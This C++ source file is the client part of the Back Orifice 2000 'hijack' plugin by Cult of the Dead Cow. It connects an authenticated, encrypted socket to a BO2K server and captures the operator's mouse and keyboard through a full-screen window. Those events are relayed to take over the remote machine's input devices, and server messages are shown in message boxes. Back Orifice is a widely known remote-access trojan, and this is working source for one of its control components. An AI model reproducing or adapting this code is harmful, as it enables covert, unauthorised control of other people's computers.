/*  Back Orifice 2000 - Remote Administration Suite
    Copyright (C) 1999, Cult Of The Dead Cow

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

	The author of this program may be contacted at dildog@l0pht.com. */

#include<windows.h>
#include<commctrl.h>
#include<plugins.h>
#include<bocomreg.h>
#include<auth.h>
#include<iohandler.h>
#include<encryption.h>
#include<config.h>
#include"bo_peep.h"
#include"hiclient.h"
#include"resource.h"


typedef struct {
	// Windows
	HWND hParent;
	HWND hDialog;

	// Move tick timing
	DWORD dwLastMoveTick;
	DWORD dwMoveTickDiff;

	// Remote switch
	BOOL bRemote;
	BOOL bOwnedMouse;
	BOOL bOwnedKeybd;
	HWND hwndRemInput;
	
	// Misc
	CAuthSocket *pSock;
	WORD wFlags;
	HICON hiMouse;
	HICON hiKeybd;
	HCURSOR hcInactive;
	char svCaption[32];
} HIJACK_CONTEXT;


// HijackConnect: Prompts the user for connection information,
// connects an authenticated socket, and updates the dialog box

int HijackConnect(HIJACK_CONTEXT *hjcontext) 
{
	// Update dialog box
	SendDlgItemMessage(hjcontext->hDialog,IDC_CONNECT,BM_SETCHECK,BST_CHECKED,0);
	SendDlgItemMessage(hjcontext->hDialog,IDC_CONNECT,WM_SETTEXT,0,(LPARAM)"Disconnect");

	// Create connection socket
	CAuthSocket *pSock=ConnectAuthSocket(InteractiveConnect,0,hjcontext->hDialog,
		GetCfgStr(g_szAdvancedOptions,"Hijack Bind Str"),
		GetCfgStr(g_szAdvancedOptions,"Hijack Net Module"),
		GetCfgStr(g_szAdvancedOptions,"Hijack Encryption"),
		GetCfgStr(g_szAdvancedOptions,"Hijack Auth"));
	
	if(pSock==NULL) {
		SendDlgItemMessage(hjcontext->hDialog,IDC_CONNECT,BM_SETCHECK,BST_UNCHECKED,0);
		SendDlgItemMessage(hjcontext->hDialog,IDC_CONNECT,WM_SETTEXT,0,(LPARAM)"Connect...");
		return 0;
	} else if(pSock==(CAuthSocket *)0xFFFFFFFF) {
		SendDlgItemMessage(hjcontext->hDialog,IDC_CONNECT,BM_SETCHECK,BST_UNCHECKED,0);
		SendDlgItemMessage(hjcontext->hDialog,IDC_CONNECT,WM_SETTEXT,0,(LPARAM)"Connect...");
		return -1;
	}
	
	hjcontext->pSock=pSock;
	
	char svAddr[256];
	pSock->GetRemoteAddr(svAddr,256);
	lstrcpyn(hjcontext->svCaption, svAddr, 32);
	
	// Set up buttons
	SendDlgItemMessage(hjcontext->hDialog,IDC_OWNMOUSE,BM_SETCHECK,BST_UNCHECKED,0);
	SendDlgItemMessage(hjcontext->hDialog,IDC_OWNKEYBD,BM_SETCHECK,BST_UNCHECKED,0);
	EnableWindow(GetDlgItem(hjcontext->hDialog,IDC_OWNMOUSE),TRUE);
	EnableWindow(GetDlgItem(hjcontext->hDialog,IDC_OWNKEYBD),TRUE);
		
	return 1;
}

// HijackDisconnect: Shuts down any socket, and updates the dialog box

BOOL HijackDisconnect(HIJACK_CONTEXT *hjcontext)
{
	if(hjcontext->pSock==NULL) return FALSE;

	hjcontext->pSock->Close();
	delete hjcontext->pSock;
	hjcontext->pSock=NULL;
	
	SendDlgItemMessage(hjcontext->hDialog,IDC_CONNECT,BM_SETCHECK,BST_UNCHECKED,0);
	SendDlgItemMessage(hjcontext->hDialog,IDC_CONNECT,WM_SETTEXT,0,(LPARAM)"Connect...");

	SendDlgItemMessage(hjcontext->hDialog,IDC_OWNMOUSE,BM_SETCHECK,BST_UNCHECKED,0);
	SendDlgItemMessage(hjcontext->hDialog,IDC_OWNKEYBD,BM_SETCHECK,BST_UNCHECKED,0);
	EnableWindow(GetDlgItem(hjcontext->hDialog,IDC_OWNMOUSE),FALSE);
	EnableWindow(GetDlgItem(hjcontext->hDialog,IDC_OWNKEYBD),FALSE);

	return TRUE;
}

// IssueHijackCommand: Issues a command to the server and optionally waits for a response

BOOL IssueHijackCommand(HIJACK_CONTEXT *hjcontext, HIJACK_HEADER *phh, int nHdrSize=sizeof(HIJACK_HEADER), char *svFailMsg=NULL, BOOL bWait=FALSE)
{
	HIJACK_HEADER *phh2;
	int nRet,nSize;

	if(hjcontext->pSock==NULL) return FALSE;

	// Send request
	while((nRet=hjcontext->pSock->Send((BYTE *)phh,nHdrSize))==0) Sleep(0);
	if(nRet<0) {
		MessageBox(hjcontext->hDialog,"Error sending request. Connection lost.","Connection error",MB_OK|MB_ICONINFORMATION|MB_TOPMOST|MB_SETFOREGROUND);
		HijackDisconnect(hjcontext);
		return FALSE;
	}
	
	// Wait for response
	if(bWait) {
		while((nRet=hjcontext->pSock->Recv((BYTE **)&phh2,&nSize))==0) Sleep(0);
		if(nRet<0) {
			MessageBox(hjcontext->hDialog,"Error sending request. Connection lost.","Connection error",MB_OK|MB_ICONINFORMATION|MB_TOPMOST|MB_SETFOREGROUND);
			HijackDisconnect(hjcontext);
			return FALSE;
		}
		if(nSize<sizeof(HIJACK_HEADER)) return FALSE;
		
		// Check success/failure
		if(svFailMsg) {
			if(phh2->bAction==HA_FAILURE) {
				MessageBox(hjcontext->hDialog,svFailMsg,"Permission denied",MB_OK|MB_ICONINFORMATION|MB_TOPMOST|MB_SETFOREGROUND);	
				return FALSE;
			}
		}
	}

	return TRUE;
}	


// ClientGoLocal: Switches control back to the local machine

void ClientGoLocal(HIJACK_CONTEXT *hjcontext)
{
	// Close capture window
	if(hjcontext->hwndRemInput!=NULL) {
		DestroyWindow(hjcontext->hwndRemInput);
		hjcontext->hwndRemInput=NULL;
	}
	
	hjcontext->bRemote=FALSE;	
}

// ClientGoRemote: Switches control to the remote machine

void ClientGoRemote(HIJACK_CONTEXT *hjcontext)
{	
	// Ensure we have something owned
	if(!(hjcontext->bOwnedMouse || hjcontext->bOwnedKeybd)) {
		ClientGoLocal(hjcontext);
		return;
	}
	
	// Ensure input capture window exists
	if(hjcontext->hwndRemInput==NULL) {
		hjcontext->hwndRemInput=CreateWindowEx(WS_EX_TRANSPARENT,"REMOTEMOUSE",hjcontext->svCaption,WS_POPUP|WS_MAXIMIZE|WS_VISIBLE,0,0,GetSystemMetrics(SM_CXSCREEN),GetSystemMetrics(SM_CYSCREEN),NULL,NULL,g_hInstance,hjcontext);
		if(hjcontext->hwndRemInput==NULL) return;
	}

	BringWindowToTop(hjcontext->hwndRemInput);
	SetFocus(hjcontext->hwndRemInput);
	
	hjcontext->bRemote=TRUE;
}


// ClientOwnDevice: Owns or frees a remote device

void ClientOwnDevice(HIJACK_CONTEXT *hjcontext, int nDevice, BOOL bOwn)
{
	HIJACK_HEADER hh;
	char *svFailMsg;
	
	// Create own/free request
	if(bOwn) hh.bAction=HA_OWNDEVICE;
	else hh.bAction=HA_FREEDEVICE;
			
	hh.bDevice=(BYTE)nDevice;

	if(bOwn && nDevice==HD_MOUSE) svFailMsg="Mouse could not be owned.";
	if(!bOwn && nDevice==HD_MOUSE) svFailMsg="You do not own the mouse.";
	if(bOwn && nDevice==HD_KEYBD) svFailMsg="Keyboard could not be owned.";	
	if(!bOwn && nDevice==HD_KEYBD) svFailMsg="You do not own the keyboard.";

	// Send request
	if(!IssueHijackCommand(hjcontext,&hh,sizeof(HIJACK_HEADER),svFailMsg,TRUE)) return;
	
	// Update internal variables and dialog checkboxes
	if(bOwn) {
		if(nDevice==HD_MOUSE) {
			hjcontext->bOwnedMouse=TRUE;
			SendDlgItemMessage(hjcontext->hDialog,IDC_OWNMOUSE,BM_SETCHECK,BST_CHECKED,0);
		} else if(nDevice==HD_KEYBD) {
			hjcontext->bOwnedKeybd=TRUE;
			SendDlgItemMessage(hjcontext->hDialog,IDC_OWNKEYBD,BM_SETCHECK,BST_CHECKED,0);
		}
	} else {
		if(nDevice==HD_MOUSE) {
			hjcontext->bOwnedMouse=FALSE;
			SendDlgItemMessage(hjcontext->hDialog,IDC_OWNMOUSE,BM_SETCHECK,BST_UNCHECKED,0);
		} else if(nDevice==HD_KEYBD) {
			hjcontext->bOwnedKeybd=FALSE;
			SendDlgItemMessage(hjcontext->hDialog,IDC_OWNKEYBD,BM_SETCHECK,BST_UNCHECKED,0);
		}
	}

	// Update remote status
	if(hjcontext->bRemote) ClientGoRemote(hjcontext);
}

// CapInputWndProc: Mouse and keyboard message capture window procedure

LRESULT CALLBACK CapInputWndProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	HIJACK_CONTEXT *hjcontext=(HIJACK_CONTEXT *)GetWindowLong(hwnd,GWL_USERDATA);
	switch(uMsg) {
	case WM_NCCREATE: 
		{
			// Store hijack context
			LPCREATESTRUCT lpcs=(LPCREATESTRUCT)lParam;
			SetWindowLong(hwnd,GWL_USERDATA,(LONG)lpcs->lpCreateParams);
			hjcontext=(HIJACK_CONTEXT *)(lpcs->lpCreateParams);		
		}
		return TRUE;
	case WM_ACTIVATE:
		{
			WORD fActive = LOWORD(wParam);           // activation flag 
			BOOL fMinimized = (BOOL) HIWORD(wParam); // minimized flag 
			HWND hwndPrevious = (HWND) lParam;       // window handle  
			
			if(fActive==WA_INACTIVE) {
				// If window loses focus, we should kill it.
				ClientGoLocal(hjcontext);
				return TRUE;
			}
		}
		break;
	
	case WM_SETCURSOR:
		return (LRESULT) SetCursor(hjcontext->hcInactive);
		

	default:		
		// ------ Handle mouse input -----------
		if(hjcontext->bOwnedMouse) {
			BOOL bMouseMsg=TRUE;
			HIJACK_HEADER hh;
			DWORD dwTick;
			memset(&hh,0,sizeof(HIJACK_HEADER));
			
			hh.bDevice=HD_MOUSE;
			
			switch(uMsg) {
			case WM_MOUSEMOVE:
				dwTick=GetTickCount();
				if((dwTick-hjcontext->dwLastMoveTick)>hjcontext->dwMoveTickDiff) {
					hh.bAction=HA_MOVE;
					hjcontext->dwLastMoveTick=dwTick;
				} else bMouseMsg=FALSE;
				break;
			case WM_LBUTTONDOWN:
				hh.bAction=HA_LBUTTONDOWN;
				break;
			case WM_MBUTTONDOWN:
				hh.bAction=HA_MBUTTONDOWN;
				break;
			case WM_RBUTTONDOWN:
				hh.bAction=HA_RBUTTONDOWN;
				break;
			case WM_LBUTTONUP:
				hh.bAction=HA_LBUTTONUP;
				break;
			case WM_MBUTTONUP:
				hh.bAction=HA_MBUTTONUP;
				break;
			case WM_RBUTTONUP:
				hh.bAction=HA_RBUTTONUP;
				break;
			case WM_LBUTTONDBLCLK:
				hh.bAction=HA_LBUTTONDBL;
				break;
			case WM_MBUTTONDBLCLK:
				hh.bAction=HA_MBUTTONDBL;
				break;
			case WM_RBUTTONDBLCLK:
				hh.bAction=HA_RBUTTONDBL;
				break;
			default:
				bMouseMsg=FALSE;
				break;
			}
			
			if(bMouseMsg) {
				hh.mouse.wPosX=(LOWORD(lParam)*65536)/GetSystemMetrics(SM_CXSCREEN);
				hh.mouse.wPosY=(HIWORD(lParam)*65536)/GetSystemMetrics(SM_CYSCREEN);
				
				IssueHijackCommand(hjcontext,&hh,sizeof(HIJACK_HEADER));
			}
		}
		// ------ Handle keyboard input ---------
		if(hjcontext->bOwnedKeybd) {
			BOOL bKeybdMsg=TRUE;
			HIJACK_HEADER hh;
			memset(&hh,0,sizeof(HIJACK_HEADER));
			hh.bDevice=HD_KEYBD;
			
			switch(uMsg) {
			case WM_KEYDOWN:
				hh.bAction=HA_KEYDOWN;
				hh.keybd.dwKeyFlags=0;
				break;
			case WM_KEYUP:
				hh.bAction=HA_KEYUP;
				hh.keybd.dwKeyFlags=KEYEVENTF_KEYUP;
				break;
			case WM_SYSKEYDOWN:
				hh.bAction=HA_KEYDOWN;
				hh.keybd.dwKeyFlags=0;
				break;
			case WM_SYSKEYUP:
				hh.bAction=HA_KEYUP;
				hh.keybd.dwKeyFlags=KEYEVENTF_KEYUP;
				break;
			default:
				bKeybdMsg=FALSE;
				break;
			}
			
			if(bKeybdMsg) {
				hh.keybd.bVirtKey=(BYTE)wParam;
				hh.keybd.bScanCode=(BYTE)(lParam>>16);
				hh.keybd.dwKeyFlags|=(lParam & (1<<24))?KEYEVENTF_EXTENDEDKEY:0;
				IssueHijackCommand(hjcontext,&hh,sizeof(HIJACK_HEADER));
			}
		}
		break;
	}
		
	return DefWindowProc(hwnd,uMsg,wParam,lParam);
}
 

// HijackDlgProc: Dialog Procedure for Hijack client

BOOL CALLBACK HijackDlgProc(HWND hwndDlg, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	HIJACK_CONTEXT *hjcontext=(HIJACK_CONTEXT *)GetWindowLong(hwndDlg,GWL_USERDATA);
		
	WORD wID,wNotifyCode;
	HWND hwndCtl;
	WORD uCmdType, xPos, yPos;
	WORD wHotKey;
	
	switch(uMsg) {
	case WM_INITDIALOG:
		SetWindowLong(hwndDlg,GWL_USERDATA,(LONG)lParam);
		
		// Initialize Hijack context
		hjcontext=(HIJACK_CONTEXT *)lParam;
		hjcontext->hDialog=hwndDlg;
	
		hjcontext->pSock=NULL;
		hjcontext->bRemote=FALSE;
		hjcontext->bOwnedMouse=FALSE;
		hjcontext->bOwnedKeybd=FALSE;
		hjcontext->wFlags=0;
		hjcontext->svCaption[0]='\0';
		hjcontext->hiMouse=(HICON)LoadImage(g_hInstance,MAKEINTRESOURCE(IDI_MOUSE),IMAGE_ICON,0,0,LR_DEFAULTSIZE);
		hjcontext->hiKeybd=(HICON)LoadImage(g_hInstance,MAKEINTRESOURCE(IDI_KEYBOARD),IMAGE_ICON,0,0,LR_DEFAULTSIZE);
		hjcontext->hcInactive=(HCURSOR)LoadImage(g_hInstance,MAKEINTRESOURCE(IDC_INACTIVE),IMAGE_CURSOR,0,0,LR_DEFAULTSIZE);
		hjcontext->hwndRemInput=NULL;
		hjcontext->dwMoveTickDiff=30;
		hjcontext->dwLastMoveTick=GetTickCount();

		// Set up bitmap buttons
		SendDlgItemMessage(hwndDlg,IDC_OWNMOUSE,BM_SETIMAGE,IMAGE_ICON,(LPARAM)hjcontext->hiMouse);
		SendDlgItemMessage(hwndDlg,IDC_OWNKEYBD,BM_SETIMAGE,IMAGE_ICON,(LPARAM)hjcontext->hiKeybd);
		SendDlgItemMessage(hjcontext->hDialog,IDC_OWNMOUSE,BM_SETCHECK,BST_UNCHECKED,0);
		SendDlgItemMessage(hjcontext->hDialog,IDC_OWNKEYBD,BM_SETCHECK,BST_UNCHECKED,0);
		EnableWindow(GetDlgItem(hjcontext->hDialog,IDC_OWNMOUSE),FALSE);
		EnableWindow(GetDlgItem(hjcontext->hDialog,IDC_OWNKEYBD),FALSE);
	
		// Set initial hotkey
		SendDlgItemMessage(hwndDlg,IDC_HOTKEY,HKM_SETRULES,HKCOMB_NONE|HKCOMB_S,HOTKEYF_ALT|HOTKEYF_CONTROL);
		SendDlgItemMessage(hwndDlg,IDC_HOTKEY,HKM_SETHOTKEY,MAKEWORD('Z',HOTKEYF_ALT|HOTKEYF_CONTROL),0);
		SendMessage(hwndDlg,WM_SETHOTKEY,MAKEWORD('Z',HOTKEYF_ALT|HOTKEYF_CONTROL),0);
		
		// Set initial mouse movetick
		SetDlgItemInt(hwndDlg,IDC_MOUSETIME,hjcontext->dwMoveTickDiff,FALSE);

		return TRUE;

	case WM_CLOSE:
		PostQuitMessage(0);
		return TRUE;

	case WM_COMMAND:
		wNotifyCode = HIWORD(wParam); // notification code 
		wID = LOWORD(wParam);         // item, control, or accelerator identifier 
		hwndCtl = (HWND) lParam;      // handle of control 
		switch(wID) {
		case IDC_CONNECT:
			if(hjcontext->pSock==NULL) {
				if(HijackConnect(hjcontext)==-1) {
					MessageBox(hjcontext->hDialog,"Could not connect to Hijack address.\n","Connection error",MB_OK|MB_SETFOREGROUND|MB_TOPMOST|MB_ICONWARNING);	
				}
			} else {
				HijackDisconnect(hjcontext);
			}
			return TRUE;

		case IDC_HOTKEY:
			wHotKey=(WORD)SendDlgItemMessage(hwndDlg,IDC_HOTKEY,HKM_GETHOTKEY,0,0);
			if(wHotKey==0) {
				wHotKey=MAKEWORD('Z',HOTKEYF_ALT|HOTKEYF_CONTROL);
				SendDlgItemMessage(hwndDlg,IDC_HOTKEY,HKM_SETHOTKEY,wHotKey,0);
			}
			SendMessage(hwndDlg,WM_SETHOTKEY,wHotKey,0);
			return TRUE;

		case IDC_LOCK:
			if(SendDlgItemMessage(hwndDlg,IDC_LOCK,BM_GETCHECK,0,0)==BST_CHECKED) {
				SetWindowText(GetDlgItem(hwndDlg,IDC_LOCK),"Save");
				EnableWindow(GetDlgItem(hwndDlg,IDC_MOUSETIME),TRUE);
				EnableWindow(GetDlgItem(hwndDlg,IDC_MOUSETIMETEXT),TRUE);
				EnableWindow(GetDlgItem(hwndDlg,IDC_HOTKEY),TRUE);
				EnableWindow(GetDlgItem(hwndDlg,IDC_HOTKEYTEXT),TRUE);
			} else {
				hjcontext->dwMoveTickDiff=GetDlgItemInt(hwndDlg,IDC_MOUSETIME,NULL,FALSE);
				SetWindowText(GetDlgItem(hwndDlg,IDC_LOCK),"Settings...");
				EnableWindow(GetDlgItem(hwndDlg,IDC_MOUSETIME),FALSE);
				EnableWindow(GetDlgItem(hwndDlg,IDC_MOUSETIMETEXT),FALSE);
				EnableWindow(GetDlgItem(hwndDlg,IDC_HOTKEY),FALSE);
				EnableWindow(GetDlgItem(hwndDlg,IDC_HOTKEYTEXT),FALSE);
			}
			return TRUE;

		case IDC_OWNMOUSE:
			if(SendDlgItemMessage(hwndDlg,IDC_OWNMOUSE,BM_GETCHECK,0,0)==BST_UNCHECKED) {
				ClientOwnDevice(hjcontext,HD_MOUSE,TRUE);
			} else {
				ClientOwnDevice(hjcontext,HD_MOUSE,FALSE);
			}
			return TRUE;
			
			
		case IDC_OWNKEYBD:
			if(SendDlgItemMessage(hwndDlg,IDC_OWNKEYBD,BM_GETCHECK,0,0)==BST_UNCHECKED) {
				ClientOwnDevice(hjcontext,HD_KEYBD,TRUE);
			} else {
				ClientOwnDevice(hjcontext,HD_KEYBD,FALSE);
			}
			return TRUE;
		}
		return FALSE;

	case WM_SYSCOMMAND:
		uCmdType = wParam;        // type of system command requested 
		xPos = LOWORD(lParam);    // horizontal position, in screen coordinates 
		yPos = HIWORD(lParam);    // vertical position, in screen coordinates 
		switch(uCmdType) {
		case SC_HOTKEY:
			SetFocus(NULL);
			if(hjcontext->bRemote==FALSE) {
				ClientGoRemote(hjcontext);
			} else {
				ClientGoLocal(hjcontext);
			}			
			return TRUE;
		}
		return FALSE;

	case WM_DESTROY:
		
		ClientGoLocal(hjcontext);
		if(hjcontext->pSock!=NULL) HijackDisconnect(hjcontext);
		DestroyCursor(hjcontext->hcInactive);
		DeleteObject(hjcontext->hiKeybd);
		DeleteObject(hjcontext->hiMouse);
		return TRUE;
	}
	
	return FALSE;
}

// HijackThread: Desktop hijacking thread

DWORD WINAPI HijackThread(LPVOID *pArgs)
{
	HWND hParent,hHijackDlg;

	// Thread housekeeping
	InterlockedIncrement(&g_nNumThreads);
	hParent=(HWND)pArgs;
	
	// Create context to keep hijack info
	HIJACK_CONTEXT *hjcontext=(HIJACK_CONTEXT *) malloc(sizeof(HIJACK_CONTEXT));	
	if(hjcontext==NULL) {
		InterlockedDecrement(&g_nNumThreads);
		return -1;
	}	
	hjcontext->hParent=hParent;
	hjcontext->pSock=NULL;
	
	// Create mouse capture window class
	WNDCLASSEX wndclassex;
	wndclassex.cbSize=sizeof(WNDCLASSEX);
	wndclassex.style=CS_DBLCLKS;
	wndclassex.lpfnWndProc=CapInputWndProc;
	wndclassex.cbClsExtra=0;
	wndclassex.cbWndExtra=0;
	wndclassex.hInstance=g_hInstance;
	wndclassex.hIcon=NULL;
	wndclassex.hCursor=NULL;
	wndclassex.hbrBackground=NULL;
	wndclassex.lpszMenuName=NULL;
	wndclassex.lpszClassName="REMOTEMOUSE";
	wndclassex.hIconSm=NULL;
	RegisterClassEx(&wndclassex);

	// Create hijack window
	hHijackDlg=CreateDialogParam(g_hInstance,MAKEINTRESOURCE(IDD_HIJACKDLG),hParent,HijackDlgProc,(LPARAM)hjcontext);
	
	MSG msg;
	while(g_bActive) {
		Sleep(20);
		// ---------------- Handle message processing ----------------
		if(PeekMessage(&msg,NULL,0,0,PM_REMOVE)) {
			if(msg.message==WM_QUIT) goto doneclient;
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}

		// --------------- Handle hijack socket ------------------
		if(hjcontext->pSock==NULL) continue;
			
		// Get hijack packet header
		CAuthSocket *pSock=hjcontext->pSock;
		HIJACK_HEADER *pHeader;
		int nSize,nRet;
		if((nRet=pSock->Recv((BYTE **)&pHeader,&nSize))>0) {
			if(nSize<sizeof(HIJACK_HEADER)) {
				pSock->Free((BYTE*)pHeader);
				continue;
			}
			// --------- Check for message -----------
			if(pHeader->bAction==HA_MESSAGE) {
				// Get the hijack message 
				BYTE *pData=(BYTE *)malloc(pHeader->message.dwDataLen);
				if(pData==NULL) {
					pSock->Free((BYTE*)pHeader);
					break;
				}
				
				int i=0;
				while(i<(int)pHeader->message.dwDataLen) {
					BYTE *pFrame;
					while((nRet=pSock->Recv(&pFrame,&nSize))==0) Sleep(0);
					if(nRet<0) {
						MessageBox(hHijackDlg,"Hijack connection lost.\n","Connection error",MB_OK|MB_SETFOREGROUND|MB_TOPMOST|MB_ICONWARNING);	
						break;
					}
					memcpy(pData+i,pFrame,nSize);
					pSock->Free(pFrame);
					i+=nSize;
				}
				if(nRet<0) break;

				// Display the message
				MessageBox(hHijackDlg,(LPCTSTR)pData,"Message From Server:",MB_OK|MB_ICONINFORMATION|MB_TOPMOST|MB_SETFOREGROUND);
				free(pData);
			} 
			
			// ------------- Clean up -------------
			pSock->Free((BYTE *)pHeader);
		}
		
		if(nRet<0) {
			// Disconnect on error
			HijackDisconnect(hjcontext);
		}
	}
doneclient:;
	DestroyWindow(hHijackDlg);

	UnregisterClass("REMOTEMOUSE",g_hInstance);
	free(hjcontext);	
	InterlockedDecrement(&g_nNumThreads);

	return 0;
}
	

int CreateHijackClient(HWND hParent)
{
	DWORD dwtid;
	HANDLE htd;

	htd=CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)HijackThread,(LPVOID)hParent,0,&dwtid);
	if(htd==NULL) {
		return -1;
	}
	CloseHandle(htd);
	
	return 0;
}